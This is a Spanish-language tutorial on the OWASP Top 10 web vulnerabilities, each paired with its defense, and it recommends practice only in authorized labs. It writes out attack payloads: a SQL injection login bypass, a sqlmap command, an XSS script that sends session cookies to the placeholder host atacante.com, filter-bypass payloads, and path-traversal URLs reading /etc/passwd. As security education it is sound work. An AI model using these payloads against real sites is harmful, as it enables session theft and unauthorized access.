Hacking Web — OWASP Top 10 explicado y practicado

Las aplicaciones web son el vector de ataque más explotado del mundo. Casi todo hoy es una app web: bancos, tiendas, redes sociales, paneles de administración. En esta lección aprenderás las 10 vulnerabilidades web más críticas según OWASP, cómo funcionan, cómo explotarlas y cómo defenderse contra ellas.

1. ¿Qué es OWASP?

OWASP (Open Web Application Security Project) es una comunidad abierta que publica estándares, herramientas y guías de seguridad web. Su publicación más famosa es el OWASP Top 10: la lista de las 10 vulnerabilidades más críticas en aplicaciones web, actualizada cada pocos años.

2. SQL Injection (SQLi)

La inyección SQL ocurre cuando un atacante puede insertar código SQL malicioso en un campo de entrada que la aplicación envía directamente a la base de datos sin validar.

SQL Injection — Ejemplo paso a paso
# Código PHP vulnerable (NO hagas esto):
$query = "SELECT * FROM users WHERE user='$username' AND pass='$password'";

# Si el atacante escribe en el campo de usuario:
admin' OR '1'='1' -- 

# La consulta se convierte en:
SELECT * FROM users WHERE user='admin' OR '1'='1' -- ' AND pass=''

# Desglose:
# admin'        → cierra la comilla del campo user
# OR '1'='1'    → siempre verdadero, devuelve todos los registros
# --            → comenta el resto de la consulta (ignora la contraseña)

# Resultado: acceso como admin sin conocer la contraseña

# Tipos de SQLi:
# 1. In-band (Classic): ves el resultado en la página
# 2. Blind: no ves resultado directo, pero puedes inferir datos
#    - Boolean-based: la página cambia según true/false
#    - Time-based: usas SLEEP() para inferir datos por el retardo
# 3. Out-of-band: extraes datos por canales alternativos (DNS, HTTP)

Herramienta automática: sqlmap automatiza la detección y explotación de SQLi. Uso: sqlmap -u "http://target/page?id=1" --dbs

Defensa: Usar consultas parametrizadas (prepared statements) y nunca concatenar input del usuario directamente en SQL.

3. Cross-Site Scripting (XSS)

XSS ocurre cuando un atacante puede inyectar código JavaScript malicioso en una página web que otros usuarios verán. El código se ejecuta en el navegador de la víctima.

TipoCómo funcionaEjemplo
Reflected XSSEl script malicioso va en la URL y se refleja en la respuesta.http://site.com/search?q=<script>alert(1)</script>
Stored XSSEl script se guarda en la base de datos y se ejecuta para todos los usuarios que vean esa página.Comentario en un foro con <script> que roba cookies de todos los lectores.
DOM-based XSSEl script se ejecuta manipulando el DOM del navegador sin pasar por el servidor.JavaScript del cliente lee un parámetro de la URL y lo inserta sin sanitizar.
Payloads XSS comunes
# Payload básico de prueba
<script>alert('XSS')</script>

# Robar cookie de sesión (Stored XSS)
<script>
  new Image().src="http://atacante.com/steal?c="+document.cookie;
</script>

# Bypass de filtros
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<body onload="alert('XSS')">

Defensa: Escapar toda salida (HTML encoding), usar Content-Security-Policy headers, y marcar cookies como HttpOnly (no accesibles por JavaScript).

4. Cross-Site Request Forgery (CSRF)

CSRF engaña al navegador de la víctima para que haga una petición a un sitio donde ya está autenticada, sin que ella lo sepa. El navegador envía automáticamente las cookies de sesión.

Analogía: carta firmada sin leer

Imagina que alguien te da un documento para firmar y tú firmas sin leerlo. Resulta que era una transferencia bancaria. Eso es CSRF: el atacante crea una petición maliciosa y tu navegador la "firma" automáticamente con tu sesión activa.

Defensa contra CSRF

Usar tokens CSRF: cada formulario incluye un token secreto único que el servidor verifica. El atacante no puede conocer este token.

5. IDOR — Insecure Direct Object Reference

IDOR ocurre cuando una aplicación usa identificadores directos (IDs) para acceder a recursos sin verificar que el usuario tiene permiso.

IDOR — Ejemplo
# Tu perfil:
https://app.com/profile?id=1234   ← tu ID

# ¿Qué pasa si cambias el ID?
https://app.com/profile?id=1235   ← ¡ves el perfil de otro usuario!
https://app.com/profile?id=1      ← ¡posiblemente el admin!

# Más ejemplos:
https://app.com/invoice/download?id=5001   ← factura de otro cliente
https://api.com/v1/user/999/messages       ← mensajes privados de otro

IDOR es sorprendentemente común y una de las vulnerabilidades más reportadas en Bug Bounty. Siempre que veas un ID numérico en una URL, intenta cambiarlo.

6. LFI / RFI — Inclusión de archivos

LFI (Local File Inclusion) permite leer archivos del servidor. RFI (Remote File Inclusion) permite incluir archivos externos (potencialmente maliciosos).

LFI — Ejemplo
# URL normal:
https://site.com/page?file=about.php

# LFI — leer /etc/passwd del servidor:
https://site.com/page?file=../../../../etc/passwd

# LFI — leer logs de Apache (para log poisoning):
https://site.com/page?file=../../../../var/log/apache2/access.log

7. Autenticación rota

Vulnerabilidades comunes en la autenticación:

  • Credenciales por defecto: admin/admin, admin/password, root/toor.
  • Sin rate limiting: puedes hacer fuerza bruta ilimitada sin bloqueo.
  • Tokens predecibles: cookies de sesión o tokens de reset con patrones adivinables.
  • Sin MFA: solo contraseña, sin segundo factor de autenticación.
  • Enumeración de usuarios: el error "usuario no encontrado" vs "contraseña incorrecta" revela qué usuarios existen.

8. Otras vulnerabilidades del OWASP Top 10

VulnerabilidadDescripción
Configuración incorrectaPáginas de debug habilitadas en producción, directorios expuestos, headers de servidor reveladores.
Componentes vulnerablesUsar librerías o frameworks desactualizados con vulnerabilidades conocidas (ej: Log4Shell).
SSRF (Server-Side Request Forgery)Hacer que el servidor realice peticiones a recursos internos (acceder a metadata de AWS, etc.).
Deserialización inseguraManipular objetos serializados para ejecutar código arbitrario en el servidor.
Logging insuficienteNo registrar eventos de seguridad, impidiendo la detección de ataques.

Practica responsable

Todas las tecnicas de esta leccion deben practicarse exclusivamente en entornos autorizados: laboratorios locales, maquinas virtuales propias o plataformas como TryHackMe y HackTheBox. El acceso no autorizado a sistemas informaticos es un delito.

9. Práctica: DVWA y WebGoat

Para practicar hacking web de forma segura, usa estas aplicaciones vulnerables en tu laboratorio:

  • DVWA (Damn Vulnerable Web Application): Instala en tu lab con docker run -d -p 80:80 vulnerables/web-dvwa
  • WebGoat (OWASP): docker run -d -p 8080:8080 webgoat/webgoat
  • bWAPP: Otra aplicación web vulnerable con +100 bugs
  • Juice Shop (OWASP): Tienda web moderna con vulnerabilidades reales
